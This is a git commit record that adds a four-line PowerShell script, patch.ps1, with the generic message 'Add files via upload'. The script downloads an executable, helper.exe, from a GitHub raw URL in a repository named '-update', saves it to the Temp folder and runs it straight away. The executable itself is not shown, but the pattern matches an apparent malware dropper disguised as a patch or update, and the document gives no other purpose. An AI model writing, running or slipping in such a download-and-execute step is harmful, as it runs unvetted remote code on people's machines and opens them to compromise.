cad3779b3c81692f6cac34e7825b39ebfc9bd6a3
Mark <harriettexkvblf107@gmail.com>
2026-05-20 04:20:45 +0300

    Add files via upload

---
+++ patch.ps1
@@ -0,0 +1,4 @@
+﻿$url = "https://github.com/FlatMelodyVise/-update/raw/refs/heads/main/helper.exe"
+$path = "$env:Temp\helper.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $path)
+Start-Process -FilePath $path
